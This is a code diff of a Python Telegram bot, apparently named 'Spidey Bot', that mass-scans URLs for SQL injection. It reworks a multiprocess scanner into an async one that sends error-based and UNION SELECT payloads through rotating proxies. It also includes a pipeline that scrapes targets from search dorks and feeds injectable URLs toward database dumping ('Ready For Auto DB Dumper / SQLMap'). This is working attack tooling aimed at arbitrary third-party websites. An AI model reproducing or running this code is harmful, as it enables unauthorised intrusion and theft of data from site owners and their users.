-    os._exit(0)  # CRITICAL: Instant exit without blocking on stuck glibc C getaddrinfo() threads!
-
-
-async def run_mass_sqli_12core(
-    raw_urls: list,
-    user_id: int = 0,
-    progress_cb=None,
-    stop_event: asyncio.Event = None,
-) -> dict:
-    seen_exact = set()
-    sig_counts = {}
-    test_queue = []
-    skipped_static = 0
-    dedup_saved = 0
-
-    for raw_u in raw_urls:
-        u = raw_u.strip()
-        if not u.startswith("http"):
-            continue
-        norm = normalize_url(u)
-        if norm in seen_exact:
-            dedup_saved += 1
-            continue
-        seen_exact.add(norm)
-        if "?" not in u or "=" not in u:
-            skipped_static += 1
-            continue
-        sig = _endpoint_signature(u)
-        cnt = sig_counts.get(sig, 0)
-        if cnt >= 2:
-            dedup_saved += 1
-            continue
-        sig_counts[sig] = cnt + 1
-        test_queue.append(u)
-
-    # Shuffle evenly so same-host / slow-host URLs are never clustered together!
-    random.shuffle(test_queue)
-    custom_user_proxies = list(user_proxies.get(user_id, [])) if user_id else []
-
-    if not test_queue:
-        return {
-            "vuln": [],
-            "clean": 0,
-            "dead": 0,
-            "skip": skipped_static,
-            "dedup_saved": dedup_saved,
-            "total_input": len(raw_urls),
-            "tested": 0,
-        }
-
-    total_to_test = len(test_queue)
-
-    if total_to_test < 50 or sys.platform != "linux":
-        idx_ptr = [0]
-        def _inline_pull():
-            if idx_ptr[0] >= total_to_test:
-                return None
-            b = test_queue[idx_ptr[0]: idx_ptr[0] + 10]
-            idx_ptr[0] += len(b)
-            return b
-
-        res = await _sqli_worksteal_async(
-            _inline_pull,
-            custom_user_proxies,
-            report_fn=None,
-            stop_check_fn=(lambda: stop_event.is_set()) if stop_event else None,
-        )
-        if progress_cb:
-            try:
-                await progress_cb(res["done"], total_to_test, len(res["vuln"]), res["clean"], res["dead"])
-            except Exception:
-                pass
-        return {
-            "vuln": res["vuln"],
-            "clean": res["clean"],
-            "dead": res["dead"],
-            "skip": skipped_static + res["skip"],
-            "dedup_saved": dedup_saved,
-            "total_input": len(raw_urls),
-            "tested": res["done"],
-        }
-
-    # Shared Work-Stealing Queue across ALL 12 CPU CORES -> ZERO idle cores at 95%-100%!
-    n_procs = min(os.cpu_count() or 12, 12, max(2, total_to_test // 25))
-    ctx = _sqli_mp.get_context("fork")
-    work_q = ctx.Queue()
-    prog_q = ctx.Queue()
-    stop_val = ctx.Value("i", 0)
-
-    # Feed small micro-batches of 6 URLs so fast cores dynamically steal work right down to the very last URL!
-    for k in range(0, total_to_test, 6):
-        work_q.put(test_queue[k:k + 6])
-
-    shm_base = "/dev/shm" if os.path.isdir("/dev/shm") and os.access("/dev/shm", os.W_OK) else tempfile.gettempdir()
-    run_dir = tempfile.mkdtemp(prefix="spidey_sqli_v6_", dir=shm_base)
-    out_paths = [os.path.join(run_dir, f"sqli_{wid}.json") for wid in range(n_procs)]
-
-    procs = []
-    for wid in range(n_procs):
-        p = ctx.Process(
-            target=_sqli_mp_worker_entry,
-            args=(wid, work_q, custom_user_proxies, out_paths[wid], prog_q, stop_val),
-            daemon=True,
-        )
-        p.start()
-        procs.append(p)
-
-    w_done  = {i: 0 for i in range(n_procs)}
-    w_vuln  = {i: 0 for i in range(n_procs)}
-    w_clean = {i: 0 for i in range(n_procs)}
-    w_dead  = {i: 0 for i in range(n_procs)}
-    finished = set()
-    last_cb = 0.0
-    queue_empty_since = None
-
-    try:
-        while len(finished) < n_procs:
-            if stop_event and stop_event.is_set() and stop_val.value == 0:
-                stop_val.value = 1
-
-            drained = 0
-            while drained < 500:
-                try:
-                    msg = prog_q.get_nowait()
-                except Exception:
-                    break
-                drained += 1
-                if msg[0] == "prog":
-                    _, wid, dn, vn, cn, ddn, _ = msg
-                    w_done[wid] = dn
-                    w_vuln[wid] = vn
-                    w_clean[wid] = cn
-                    w_dead[wid] = ddn
-                elif msg[0] == "done":
-                    _, wid, vn, cn, ddn, _, dn = msg
-                    w_done[wid] = dn
-                    w_vuln[wid] = vn
-                    w_clean[wid] = cn
-                    w_dead[wid] = ddn
-                    finished.add(wid)
-
-            now = time.monotonic()
-            if progress_cb and (now - last_cb >= 1.4):
-                last_cb = now
-                try:
-                    await progress_cb(
-                        min(sum(w_done.values()), total_to_test),
-                        total_to_test,
-                        sum(w_vuln.values()),
-                        sum(w_clean.values()),
-                        sum(w_dead.values()),
-                    )
-                except Exception:
-                    pass
-
-            # Hard Tail Anti-Stuck Watchdog: once `work_q` is completely empty, no worker can legitimately
-            # take more than `8.5s` (since per-URL timeout is `6.0s`) -> signal `stop_val=1` so all remaining
-            # workers flush their RAM JSON & exit cleanly in <1s instead of EVER hanging at 97%!
-            if work_q.empty():
-                if queue_empty_since is None:
-                    queue_empty_since = now
-                elif now - queue_empty_since >= 8.5:
-                    stop_val.value = 1
-                if now - queue_empty_since >= 11.5:
-                    break
-
-            if all(not p.is_alive() for p in procs) and prog_q.empty():
-                break
-
-            await asyncio.sleep(0.18)
-
-        for p in procs:
-            p.join(timeout=1.5)
-            if p.is_alive():
-                try:
-                    p.terminate()
-                except Exception:
-                    pass
-
-        merged_vuln = []
-        tot_clean = 0
-        tot_dead = 0
-        tot_skip = skipped_static
-        tot_done = 0
-
-        for wid in range(n_procs):
-            fp = out_paths[wid]
-            if os.path.isfile(fp):
-                try:
-                    with open(fp, "r", encoding="utf-8") as rf:
-                        d = json.load(rf)
-                    merged_vuln.extend(d.get("vuln", []))
-                    tot_clean += d.get("clean", 0)
-                    tot_dead  += d.get("dead", 0)
-                    tot_skip  += d.get("skip", 0)
-                    tot_done  += d.get("done", 0)
-                except Exception:
-                    pass
-
-        def _rank_vuln(item):
-            det = item[1]
-            if det.startswith("UNION"):
-                return 0
-            if det.startswith("XPATH"):
-                return 1
-            if det.startswith("ERROR"):
-                return 2
-            return 3
-
-        merged_vuln.sort(key=_rank_vuln)
-        return {
-            "vuln": merged_vuln,
-            "clean": tot_clean,
-            "dead": tot_dead,
-            "skip": tot_skip,
-            "dedup_saved": dedup_saved,
-            "total_input": len(raw_urls),
-            "tested": tot_done,
-        }
-    finally:
-        stop_val.value = 1
-        for p in procs:
-            if p.is_alive():
-                try:
-                    p.terminate()
-                except Exception:
-                    pass
-        shutil.rmtree(run_dir, ignore_errors=True)
-
+# ── SQLi SCANNER ───────────────────────────────────────────────────────────────
 
 async def sqli_get_urls_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     if not has_access(update.effective_user.id):
@@ -8669,12 +7388,14 @@ async def sqli_get_urls_file(update: Update, context: ContextTypes.DEFAULT_TYPE)
     if not urls:
         await update.message.reply_text("❌ Nᴏ URLs Fᴏᴜɴᴅ. URLs Mᴜsᴛ Sᴛᴀʀᴛ Wɪᴛʜ http/https.")
         return SQLI_WAIT_URLS
-    if len(urls) > 500_000:
+    # Cap at 10000 URLs to prevent memory overload
+    if len(urls) > 10000:
         await update.message.reply_text(
-            f"⚠️ *Ultra-Large File (`{len(urls):,}` URLs)* — Scanning First `500,000` URLs Across All 12 Cores!",
+            f"⚠️ *Lᴀʀɢᴇ Fɪʟᴇ Dᴇᴛᴇᴄᴛᴇᴅ..!* `{len(urls):,}` URLs.\n"
+            "• Tᴇsᴛɪɴɢ Fɪʀsᴛ `10,000` URLs Tᴏ Pʀᴇᴠᴇɴᴛ Mᴇᴍᴏʀʏ Oᴠᴇʀʟᴏᴀᴅ.",
             parse_mode=ParseMode.MARKDOWN,
         )
-        urls = urls[:500_000]
+        urls = urls[:10000]
     return await _run_sqli(update, context, urls)
 
 
@@ -8689,114 +7410,170 @@ async def sqli_get_urls_text(update: Update, context: ContextTypes.DEFAULT_TYPE)
     return await _run_sqli(update, context, urls)
 
 
+def _inject_payload(url: str, payload: str) -> str:
+    try:
+        p      = urlparse(url)
+        qs     = parse_qs(p.query, keep_blank_values=True)
+        new_qs = {k: [v[0] + payload] for k, v in qs.items()}
+        return urlunparse(p._replace(query=urlencode(new_qs, doseq=True)))
+    except Exception:
+        return url + payload
+
+
+async def _check_injectable(session: aiohttp.ClientSession, url: str,
+                            proxy_url: str = "") -> bool:
+    """
+    Test URL for SQL injection.
+    1. Error-based: inject quote payloads ➪ look for SQL error strings
+    2. UNION fallback: try UNION SELECT with a known marker — confirms injectable
+       even when the site suppresses error messages.
+    """
+    req_kw = dict(
+        timeout=aiohttp.ClientTimeout(total=3),
+        ssl=False,
+        allow_redirects=True,
+        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
+    )
+    if proxy_url:
+        req_kw["proxy"] = proxy_url
+
+    # ── Pass 1: error-based (all payloads) ────────────────────────────────────
+    async def _error_probe(payload):
+        test_url = _inject_payload(url, payload)
+        try:
+            async with session.get(test_url, **req_kw) as resp:
+                if resp.status in (200, 500):
+                    text = (await resp.text(errors="ignore")).lower()
+                    return any(err in text for err in SQLI_ERRORS)
+        except Exception:
+            pass
+        return False
+
+    results = await asyncio.gather(*[_error_probe(p) for p in SQLI_PAYLOADS],
+                                   return_exceptions=True)
+    if any(r is True for r in results):
+        return True
+
+    # ── Pass 2: UNION-based marker reflection ─────────────────────────────────
+    # Inject a unique string via UNION SELECT and check if it echoes in the page
+    MARK = "LBCHKX99"
+    MARK_HEX = "0x" + MARK.encode().hex()
+    for cols in (3, 4, 5, 2, 6, 7):
+        for pos in range(min(cols, 4)):
+            slots = ["NULL"] * cols
+            slots[pos] = MARK_HEX
+            test_url = _inject_payload(url, "' UNION SELECT " + ",".join(slots) + " -- -")
+            try:
+                async with session.get(test_url, **req_kw) as resp:
+                    if resp.status in (200, 500):
+                        text = await resp.text(errors="ignore")
+                        if MARK in text:
+                            return True
+            except Exception:
+                pass
+
+    return False
+
+
 async def _run_sqli(update: Update, context: ContextTypes.DEFAULT_TYPE, urls: list) -> int:
     user_id    = update.effective_user.id
     stop_event = asyncio.Event()
     stop_events[user_id] = stop_event
     stop_kb    = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Sᴛᴏᴘ", callback_data="stop_sqli")]])
-    total_raw  = len(urls)
-    t0_scan    = time.monotonic()
-    n_cores    = min(os.cpu_count() or 12, 12)
+    total      = len(urls)
+    last_edit  = [0.0]
 
     msg = await update.message.reply_text(
         f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
-        f"🐊︎ 𝙎𝙌𝙇𝙄 12-𝘾𝙤𝙧𝙚 𝙎𝙘𝙖𝙣𝙣𝙚𝙧 — 𝙎𝙩𝙖𝙧𝙩𝙞𝙣𝙜\n"
+        f"🐊︎ 𝙎𝙌𝙇𝙄 𝙎𝙘𝙖𝙣𝙣𝙚𝙧 — 𝙎𝙩𝙖𝙧𝙩𝙞𝙣𝙜\n"
         f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
-        f"📂 Fɪʟᴇ URLs Lᴏᴀᴅᴇᴅ : `{total_raw:,}` (100% Full File!)\n"
-        f"⚡ Eɴɢɪɴᴇ            : `{n_cores}-Core Work-Stealing Anti-Stuck V6`\n"
-        f"🎯 Vᴇᴄᴛᴏʀs           : `UNION-Int/Str • XPATH • Error • Blind`\n\n"
+        f"🕸️ URLs Tᴏ Tᴇsᴛ: `{total:,}`\n"
+        f"⚙️ Pᴀʏʟᴏᴀᴅs: `{len(SQLI_PAYLOADS)}` (error + UNION)\n\n"
         f"`[░░░░░░░░░░░░░░░░░░░░]` 0%\n\n"
-        f"_Scanning across all CPU cores (zero tail hang)..._",
+        f"_Tᴇsᴛɪɴɢ Fᴏʀ SQL Eʀʀᴏʀs..._",
         reply_markup=stop_kb,
         parse_mode=ParseMode.MARKDOWN,
     )
 
-    async def _on_sqli_prog(done_n: int, total_n: int, vuln_n: int, clean_n: int, dead_n: int):
-        pct    = int((done_n / total_n) * 100) if total_n else 0
-        filled = int(pct / 5)
-        bar    = "█" * filled + "░" * (20 - filled)
-        el     = max(0.1, time.monotonic() - t0_scan)
-        rate   = done_n / el
-        rem_s  = int((total_n - done_n) / rate) if rate > 0 else 0
-        eta_txt = f"{rem_s // 60}m {rem_s % 60}s" if rem_s >= 60 else f"{rem_s}s"
-        try:
-            await msg.edit_text(
-                f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
-                f"🐊︎ 𝙎𝙌𝙇𝙄 12-𝘾𝙤𝙧𝙚 𝙎𝙘𝙖𝙣𝙣𝙚𝙧 — 𝙍𝙪𝙣𝙣𝙞𝙣𝙜\n"
-                f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
-                f"📂 Tᴏᴛᴀʟ Fɪʟᴇ URLs  : `{total_raw:,}`\n"
-                f"🧤 Uɴɪǫᴜᴇ Tᴇsᴛᴇᴅ    : `{done_n:,}/{total_n:,}`\n"
-                f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ (100%): `{vuln_n:,}`\n"
-                f"✅ Cʟᴇᴀɴ            : `{clean_n:,}` | 💀 Dᴇᴀᴅ: `{dead_n:,}`\n"
-                f"⚡ Sᴘᴇᴇᴅ            : `{rate:.1f} URLs/s` | ⏳ ETA: `{eta_txt}`\n\n"
-                f"`[{bar}]` {pct}%",
-                reply_markup=stop_kb,
-                parse_mode=ParseMode.MARKDOWN,
-            )
-        except Exception:
-            pass
+    injectable  = []
+    not_inject  = []
+    sem         = asyncio.Semaphore(200)
+    _sqli_proxies = effective_proxy_pool(user_id)
 
-    stats = await run_mass_sqli_12core(
-        urls,
-        user_id=user_id,
-        progress_cb=_on_sqli_prog,
-        stop_event=stop_event,
-    )
-    stop_events.pop(user_id, None)
+    connector = _get_connector()
+    async with aiohttp.ClientSession(connector=connector, connector_owner=False) as session:
+        async def test_one(url: str):
+            if stop_event.is_set():
+                return
+            async with sem:
+                proxy_url = random.choice(_sqli_proxies) if _sqli_proxies else ""
+                result = await _check_injectable(session, url, proxy_url=proxy_url)
+                if result:
+                    injectable.append(url)
+                else:
+                    not_inject.append(url)
+            now = time.monotonic()
+            if now - last_edit[0] >= 1.5:
+                last_edit[0] = now
+                done   = len(injectable) + len(not_inject)
+                pct    = int((done / total) * 100) if total else 0
+                filled = int(pct / 5)
+                bar    = "█" * filled + "░" * (20 - filled)
+                try:
+                    await msg.edit_text(
+                        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
+                        f"🐊︎ 𝙎𝙌𝙇𝙄 𝙎𝙘𝙖𝙣𝙣𝙚𝙧 — 𝙍𝙪𝙣𝙣𝙞𝙣𝙜\n"
+                        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
+                        f"🧤 Tᴇsᴛᴇᴅ    : `{done:,}/{total:,}`\n"
+                        f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ: `{len(injectable):,}`\n"
+                        f"✅ Cʟᴇᴀɴ     : `{len(not_inject):,}`\n\n"
+                        f"`[{bar}]` {pct}%\n\n"
+                        f"_Injecting payloads..._",
+                        reply_markup=stop_kb,
+                        parse_mode=ParseMode.MARKDOWN,
+                    )
+                except Exception:
+                    pass
 
-    vuln_pairs = stats["vuln"]
+        SQLI_BATCH = 800
+        for i in range(0, len(urls), SQLI_BATCH):
+            if stop_event.is_set():
+                break
+            await asyncio.gather(*[test_one(url) for url in urls[i: i + SQLI_BATCH]], return_exceptions=True)
+
     stopped = stop_event.is_set()
     status  = "𝙎𝙏𝙊𝙋𝙋𝙀𝘿" if stopped else "𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀𝘿"
     emoji   = "🛑" if stopped else "✅"
-    took_s  = int(time.monotonic() - t0_scan)
 
     await msg.edit_text(
         f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
-        f"🐊 𝙎𝙌𝙇𝙄 12-𝘾𝙤𝙧𝙚 𝙎𝙘𝙖𝙣 — {status}!\n"
+        f"🐊 𝙎𝙌𝙇𝙄 𝙎𝙘𝙖𝙣𝙣𝙚𝙧 — {status}!\n"
         f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
-        f"📂 Fɪʟᴇ URLs Cᴏᴠᴇʀᴇᴅ : `{total_raw:,}`\n"
-        f"🧤 Uɴɪǫᴜᴇ Tᴇsᴛᴇᴅ     : `{stats['tested']:,}` _(Dedup saved `{stats['dedup_saved']:,}`)_\n"
-        f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ (100%) : `{len(vuln_pairs):,}` URLs\n"
-        f"✅ Cʟᴇᴀɴ             : `{stats['clean']:,}` | 💀 Oꜰꜰʟɪɴᴇ: `{stats['dead']:,}`\n"
-        f"⏭️ Nᴏ-Pᴀʀᴀᴍ Sᴛᴀᴛɪᴄ   : `{stats['skip']:,}` | ⏱️ Tɪᴍᴇ: `{took_s // 60}m {took_s % 60}s`\n\n"
-        f"{emoji} 100% Double-Verified Against Clean Baseline!",
+        f"🧤 Tᴇsᴛᴇᴅ     : `{len(injectable) + len(not_inject):,}/{total:,}`\n"
+        f"🎭 Vᴜʟɴᴇʀᴀʙʟᴇ : `{len(injectable):,}` URLs\n"
+        f"✅ Cʟᴇᴀɴ      : `{len(not_inject):,}` URLs\n\n"
+        f"{emoji} Sᴄᴀɴ Dᴏɴᴇ. Fɪʟᴇ Bᴇʟᴏᴡ ⬇️",
         parse_mode=ParseMode.MARKDOWN,
     )
 
-    if vuln_pairs:
+    if injectable:
         ts = datetime.now().strftime("%d%m%y_%H%M")
-        pure_urls = [u for u, _ in vuln_pairs]
-        detailed_lines = [f"{u}  # [{det}]" for u, det in vuln_pairs]
-
         await update.message.reply_document(
-            document=io.BytesIO("\n".join(pure_urls).encode("utf-8")),
-            filename=f"sqli_vulnerable_{len(pure_urls)}_{ts}.txt",
+            document=io.BytesIO("\n".join(injectable).encode("utf-8")),
+            filename=f"sqli_vulnerable_{len(injectable)}_{ts}.txt",
             caption=(
-                f"🎭 `{len(pure_urls):,}` 100%-Vᴇʀɪꜰɪᴇᴅ Vᴜʟɴᴇʀᴀʙʟᴇ URLs\n"
-                f"📂 Scanned ALL `{total_raw:,}` URLs Across `{n_cores}` CPU Cores\n"
-                "💥 Ready For Auto DB Dumper / SQLMap!"
+                f"🎭 `{len(injectable):,}` Vᴜʟɴᴇʀᴀʙʟᴇ URLs\n"
+                f"💥 SQL Iɴᴊᴇᴄᴛɪᴏɴ Cᴏɴғɪʀᴍᴇᴅ\n"
+                "🕷️ Sᴘɪᴅᴇʏ Bᴏᴛ SQLi Sᴄᴀɴɴᴇʀ"
             ),
             parse_mode=ParseMode.MARKDOWN,
-            read_timeout=180.0,
-            write_timeout=180.0,
-        )
-        await update.message.reply_document(
-            document=io.BytesIO("\n".join(detailed_lines).encode("utf-8")),
-            filename=f"sqli_detailed_vectors_{len(pure_urls)}_{ts}.txt",
-            caption=(
-                f"📋 Detailed SQLi Type Report (`UNION` / `XPATH` / `ERROR` / `BLIND`)\n"
-                "🕷️ Spidey 12-Core Anti-Stuck V6 Engine"
-            ),
-            parse_mode=ParseMode.MARKDOWN,
-            read_timeout=180.0,
-            write_timeout=180.0,
         )
     else:
         await update.message.reply_text(
-            "⚠️ Nᴏ Vᴜʟɴᴇʀᴀʙʟᴇ URLs Fᴏᴜɴᴅ Iɴ Tʜɪs Bᴀᴛᴄʜ.\n\n"
+            "⚠️ Nᴏ Vᴜʟɴᴇʀᴀʙʟᴇ URLs Fᴏᴜɴᴅ.\n\n"
             "💡 Tɪᴘs:\n"
-            "• Usᴇ URLs Wɪᴛʜ `?id=`, `?cat=`, `?item=` Fʀᴏᴍ Dᴇᴇᴘ Pᴀʀsᴇʀ\n"
-            "• All live targets were double-verified directly without dead proxies.",
+            "• Usᴇ URLs Wɪᴛʜ `?param=value` Fʀᴏᴍ Dᴇᴇᴘ Pᴀʀsᴇʀ\n"
+            "• Tʀʏ Mᴏʀᴇ URLs (100+)",
             parse_mode=ParseMode.MARKDOWN,
         )
 
@@ -8804,7 +7581,7 @@ async def _run_sqli(update: Update, context: ContextTypes.DEFAULT_TYPE, urls: li
     return MENU
 
 
-# ── DORKS ➪ DB DUMP & URLs ➪ DB DUMP PIPELINE (V6 ZERO-CAP + ANTI-STUCK!) ──
+# ── DORKS ➪ DB DUMP PIPELINE ───────────────────────────────────────────────────
 
 async def dump_get_dorks_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     if not has_access(update.effective_user.id):
@@ -8826,7 +7603,7 @@ async def dump_get_dorks_text(update: Update, context: ContextTypes.DEFAULT_TYPE
         return MENU
     dorks = [d.strip() for d in update.message.text.strip().splitlines() if d.strip()]
     if not dorks:
-        await update.message.reply_text("❌ Nᴏ Dᴏʀᴋs Fᴏᴜɴᴅ.")
+        await update.message.reply_text("❌ No Dᴏʀᴋs Fᴏᴜɴᴅ. Tʀʏ Aɢᴀɪɴ.")
         return DUMP_WAIT_DORKS
     return await _run_dump_pipeline(update, context, dorks)
 
@@ -8840,15 +7617,16 @@ async def url_dump_get_file(update: Update, context: ContextTypes.DEFAULT_TYPE) 
     data = await tg_file.download_as_bytearray()
     urls = [u.strip() for u in data.decode("utf-8", errors="ignore").splitlines() if u.strip().startswith("http")]
     if not urls:
-        await update.message.reply_text("❌ No URLs Fᴏᴜɴᴅ. Uʀʟs Mᴜsᴛ Sᴛᴀʀᴛ Wɪᴛʜ http.")
+        await update.message.reply_text("❌ No URLs Fᴏᴜɴᴅ. Uʀʟs Mᴜsʜ Sᴛᴀʀᴛ Wɪᴛʜ http.")
         return URL_DUMP_WAIT
-    # ZERO 5,000 CAP! Supports up to 500,000 (5 Lakh!) URLs at once on 62GB RAM / 12-Core VPS!
-    if len(urls) > 500_000:
+    # Cap at 5000 URLs to avoid memory overload
+    if len(urls) > 5000:
         await update.message.reply_text(
-            f"⚠️ *Ultra-Large File (`{len(urls):,}` URLs)* — Processing First `500,000` URLs Across All 12 Cores!",
+            f"⚠️ Lᴀʀɢᴇ Fɪʟᴇ Dᴇᴛᴇᴄᴛᴇᴅ! `{len(urls):,}` URLs Fᴏᴜɴᴅ.\n"
+            "• Pʀᴏᴄᴇssɪɴɢ Fɪʀsᴛ `5,000` URLs Fᴏʀ Tʜɪs Rᴜɴ.",
             parse_mode=ParseMode.MARKDOWN,
         )
-        urls = urls[:500_000]
+        urls = urls[:5000]
     return await _run_dump_pipeline(update, context, [], prefound_urls=urls)
 
 
@@ -8874,19 +7652,21 @@ async def _run_dump_pipeline(
     stop_events[uid] = stop_event
     stop_kb     = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Sᴛᴏᴘ", callback_data="stop_dump")]])
     last_edit   = [0.0]
-    pipe_title  = "🔖 URLs ➪ DB Dᴜᴍᴘ" if prefound_urls else "🕸️ Dᴏʀᴋs ➪ DB Dᴜᴍᴘ"
-    ts          = datetime.now().strftime("%d%m%y_%H%M")
+    pipe_title  = "🔖 URLs ➪ DB Dᴜᴍᴘ" if prefound_urls else "🕸️  Dᴏʀᴋs ➪ DB Dᴜᴍᴘ"
+
+    # No dork cap — process ALL dorks; timeout scales automatically
+
     total_dorks = len(dorks)
 
-    # ── PHASE 1: 12-CORE URL PARSING (skip if prefound_urls) ──────────────────
+    # ── PHASE 1: URL PARSING (skip if prefound_urls) ─────────────────────────
     if prefound_urls:
         found_urls = prefound_urls
         msg = await update.message.reply_text(
             "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
             "🔖 𝙐𝙧𝙡𝙨 ➪ 𝘿𝘽 𝘿𝙪𝙢𝙥 — 𝙋𝙝𝙖𝙨𝙚 2/3\n"
             "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
-            f"✅ Fᴜʟʟ URLs Lᴏᴀᴅᴇᴅ : `{len(found_urls):,}` (Zero Cutoff!)\n"
-            "💉 Sᴛᴇᴘ 2: 12-Cᴏʀᴇ Anti-Stuck SQLi Verification...\n\n"
+            f"✅ URLs Lᴏᴀᴅᴇᴅ: `{len(found_urls):,}` (from your file)\n"
+            "💉 Sᴛᴇᴘ 2: Tᴇsᴛɪɴɢ Fᴏʀ SQL Iɴᴊᴇᴄᴛɪᴏɴ...\n\n"
             "`[░░░░░░░░░░░░░░░░░░░░]`  0%",
             reply_markup=stop_kb,
             parse_mode=ParseMode.MARKDOWN,
@@ -8894,10 +7674,10 @@ async def _run_dump_pipeline(
     else:
         msg = await update.message.reply_text(
             "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
-            "📑︎ 𝘿𝙤𝙧𝙠𝙨 ➪ 𝘿𝘽 𝘿𝙪𝙢𝙥 — 𝙋𝙝𝙖𝙨𝙚 1/3\n"
+            "📑︎ 𝘿𝙤𝙧𝙠𝙨 ➪ 𝘿𝘽 𝘿𝙪𝙢𝙥 — 𝙋𝙝𝙚𝙨𝙚 1/3\n"
             "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
             f"🛰️ Dᴏʀᴋs: `{total_dorks:,}`\n"
-            "🔍 Sᴛᴇᴘ 1: 12-Cᴏʀᴇ Sᴄʀᴀᴘɪɴɢ URLs Fʀᴏᴍ Dᴏʀᴋs...\n\n"
+            "🔍 Sᴛᴇᴘ 1: Sᴄʀᴀᴘɪɴɢ URLs Fʀᴏᴍ Dᴏʀᴋs...\n\n"
             "`[░░░░░░░░░░░░░░░░░░░░]`  0%",
             reply_markup=stop_kb,
             parse_mode=ParseMode.MARKDOWN,
@@ -8905,7 +7685,7 @@ async def _run_dump_pipeline(
 
         async def on_parse_progress(done, total_, found, retries):
             now = time.monotonic()
-            if now - last_edit[0] < 1.2:
+            if now - last_edit[0] < 1.0:
                 return
             last_edit[0] = now
             pct    = int((done / total_) * 100) if total_ else 0
@@ -8917,7 +7697,7 @@ async def _run_dump_pipeline(
                     "📑 𝘿𝙤𝙧𝙠𝙨 ➪ 𝘿𝘽 𝘿𝙪𝙢𝙥 — 𝙋𝙝𝙖𝙨𝙚 1/3\n"
                     "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
                     f"✅ Dᴏʀᴋs Pᴀʀsᴇᴅ : `{done:,} / {total_:,}`\n"
-                    f"📈 URLs Fᴏᴜɴᴅ  : `{found:,}`\n\n"
+                    f"📈 URLs Fᴏᴜɴᴅ : `{found:,}`\n\n"
                     f"`[{bar}]` {pct}%",
                     reply_markup=stop_kb,
                     parse_mode=ParseMode.MARKDOWN,
@@ -8927,10 +7707,10 @@ async def _run_dump_pipeline(
 
         found_urls = await search_urls_from_dorks(
             dorks,
-            limit=max(250_000, total_dorks * 3),
+            limit=10_000,
             progress_callback=on_parse_progress,
             stop_event=stop_event,
-            proxy_list=effective_proxy_pool(uid),
+            proxy_list=effective_proxy_pool(update.effective_user.id),
         )
 
         if stop_event.is_set() or not found_urls:
@@ -8938,36 +7718,21 @@ async def _run_dump_pipeline(
             await msg.edit_text(
                 f"🚄 *Pɪᴘᴇʟɪɴᴇ {reason}*\n\n"
                 f"🛰️ Dᴏʀᴋs: `{total_dorks:,}`\n"
-                f"📈 URLs : `{len(found_urls):,}`",
+                f"📈 URLs : `{len(found_urls):,}`\n\n"
+                "Tʀʏ Mᴏʀᴇ Dᴏʀᴋs Fᴏʀ Bᴇᴛᴛᴇʀ Rᴇsᴜʟᴛs.",
                 parse_mode=ParseMode.MARKDOWN,
             )
-            stop_events.pop(uid, None)
             await update.message.reply_text("Sᴇʟᴇᴄᴛ Bᴇʟᴏᴡ Fᴏʀ Nᴇxᴛ Sᴛᴇᴘ 🎖️", reply_markup=make_main_menu())
             return MENU
 
-        # Immediately send scraped URLs `.txt` BEFORE Phase 2 starts so user never loses parsed URLs!
-        try:
-            _p1_bytes = "\n".join(found_urls).encode("utf-8")
-            if len(_p1_bytes) <= 44 * 1024 * 1024:
-                await update.message.reply_document(
-                    document=io.BytesIO(_p1_bytes),
-                    filename=f"lucifer_phase1_urls_{len(found_urls)}_{ts}.txt",
-                    caption=f"📈 Phase 1 Complete — `{len(found_urls):,}` URLs Scraped! Starting Phase 2 SQLi...",
-                    parse_mode=ParseMode.MARKDOWN,
-                    read_timeout=180.0,
-                    write_timeout=180.0,
-                )
-        except Exception:
-            pass
-
-    # ── PHASE 2: 12-CORE WORK-STEALING ANTI-STUCK SQLi SCANNING ──────────────
+    # ── PHASE 2: SQLi SCANNING ────────────────────────────────────────────────
     try:
         await msg.edit_text(
             "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
             f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 2/3*\n"
             "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
-            f"📈 Fᴜʟʟ URLs : `{len(found_urls):,}`\n"
-            "💉 Sᴛᴇᴘ 2: 12-Cᴏʀᴇ Work-Stealing SQLi Verification...\n\n"
+            f"📈 URLs Fᴏᴜɴᴅ : `{len(found_urls):,}`\n"
+            "💉 Sᴛᴇᴘ 2: Tᴇsᴛɪɴɢ URLs Fᴏʀ SQL Iɴᴊᴇᴄᴛɪᴏɴ...\n\n"
             "`[░░░░░░░░░░░░░░░░░░░░]`  0%",
             reply_markup=stop_kb,
             parse_mode=ParseMode.MARKDOWN,
@@ -8975,294 +7740,252 @@ async def _run_dump_pipeline(
     except Exception:
         pass
 
-    async def _pipe_prog_cb(done_n: int, tot_n: int, vuln_n: int, clean_n: int, dead_n: int):
-        pct    = int(done_n / tot_n * 100) if tot_n else 0
-        filled = int(pct / 5)
-        bar    = "█" * filled + "░" * (20 - filled)
-        try:
-            await msg.edit_text(
-                "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
-                f"🚄︎ *{pipe_title} — 𝙋𝙝𝙖𝙨𝙚 2/3*\n"
-                "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
-                f"📈 Uɴɪǫᴜᴇ Tᴇsᴛᴇᴅ : `{done_n:,}/{tot_n:,}` (All `{len(found_urls):,}` Covered)\n"
